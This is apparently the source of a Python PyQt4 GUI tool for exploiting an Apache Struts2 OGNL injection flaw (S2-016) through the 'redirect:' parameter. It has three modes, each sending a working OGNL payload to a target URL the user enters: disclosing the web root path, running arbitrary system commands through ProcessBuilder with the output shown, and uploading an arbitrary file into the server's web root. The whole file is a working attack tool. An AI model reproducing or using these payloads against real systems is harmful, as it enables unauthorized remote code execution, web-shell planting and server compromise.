# -*- coding:utf-8 -*-
import sys
from PyQt4 import QtCore, QtGui, QtWebKit
from s2016 import Ui_MainWindow
import urllib.request
import urllib.parse
import urllib
import requests

class StartQt4(QtGui.QMainWindow):
    def __init__(self, parent=None):
        QtGui.QWidget.__init__(self, parent)
        self.ui = Ui_MainWindow() #框主题名称
        self.ui.setupUi(self) 
        QtCore.QObject.connect(self.ui.lineEdit, QtCore.SIGNAL('returnPressed()'), self.Go)
        QtCore.QObject.connect(self.ui.pushButton, QtCore.SIGNAL("clicked()"), self.Go)
        QtCore.QObject.connect(self.ui.comboBox, QtCore.SIGNAL("currentIndexChanged(int)"), self.mode)
        QtCore.QObject.connect(self.ui.pushButton_2, QtCore.SIGNAL("clicked()"), self.file_dialog)

    def PoC(self):
        payload = "?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D"
        target_url = (self.address + payload)
        #print(target_url)
        try:
            req = urllib.request.Request(target_url, method = "GET")
            response = urllib.request.urlopen(req) 
            if response:
                data = response.read()
                data = str(data, encoding = "utf-8")
                self.ui.textBrowser.setText("测试结果：\n%s" %(data)) #将结果输出至textBrowser
        except Exception as e:
            self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
        
    def cmd(self):
        self.command = str(self.ui.command.text())
        #payload = "%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{command})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()".format(command = self.command)
        payload = "?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{" + '"' + self.command + '"'+ "})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23mat.getWriter().close()}"
        target_url = (self.address + payload)
        #print(target_url)
        try:
            req = requests.get(target_url)
            data = req.content
            #print(data)
            data = str(data, encoding = "utf-8")
            self.ui.textBrowser.setText("%s命令执行结果：\n%s" %(self.command, data.rstrip())) #将结果输出至textBrowser
        except Exception as e:
            self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))

    def Go(self):
        self.address = str(self.ui.lineEdit.text())
        if self.address:
            if self.address.find('://') == -1:
               self.address = 'http://' + self.address
        if self.ui.comboBox.currentIndex() == 0:
            self.PoC()
        if self.ui.comboBox.currentIndex() == 1:
            self.cmd()
        elif self.ui.comboBox.currentIndex() == 2:
            self.upload()

    def file_dialog(self):
        fd = QtGui.QFileDialog(self)
        self.file = fd.getOpenFileName()
        from os.path import isfile
        if isfile(self.file):
            import codecs
            text = codecs.open(self.file, "r", "utf-8").read() #弹出文件选择对话框
        self.filename = str(self.ui.filename.text())
        
    def upload(self): 
        content = (open(self.file, "r").read())
        data = {"t":content} 
        #print(content)
        payload = "?redirect:${{%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3dfalse%2c%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22%5d%2c%23b%3dnew+java.io.FileOutputStream(new+java.lang.StringBuilder(%23a.getRealPath(%22/%22)).append(@java.io.File@separator).append(%22"+ self.filename + '%22))%2c%23b.write(%23a.getParameter("t").getBytes())%2c%23b.close%28%29%2c%23p%3d%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%5d.getWriter%28%29%2c%23p.println%28%22DONE%22%29%2c%23p.flush%28%29%2c%23p.close%28%29}}'
        #payload = payload.replace(' ', '')
        #print(payload)
        target_url = (self.address + payload)
        try:
            #print(target_url)
            req = urllib.request.Request(target_url, urllib.parse.urlencode(data).encode("UTF-8"), method = "POST")
            response = urllib.request.urlopen(req) 
            data = response.read()
            data = str(data, encoding = "utf-8")
            self.ui.textBrowser.setText("上传成功，文件已上传至网站根目录下：\n%s" %(data)) #将结果输出至textBrowser
        except Exception as e:
            #print(e)
            self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
    def mode(self):
        self.ui.comboBox.currentIndex()
            
       
       
if __name__ == "__main__":
    app = QtGui.QApplication(sys.argv)
    myapp = StartQt4()
    myapp.show()
    sys.exit(app.exec_())
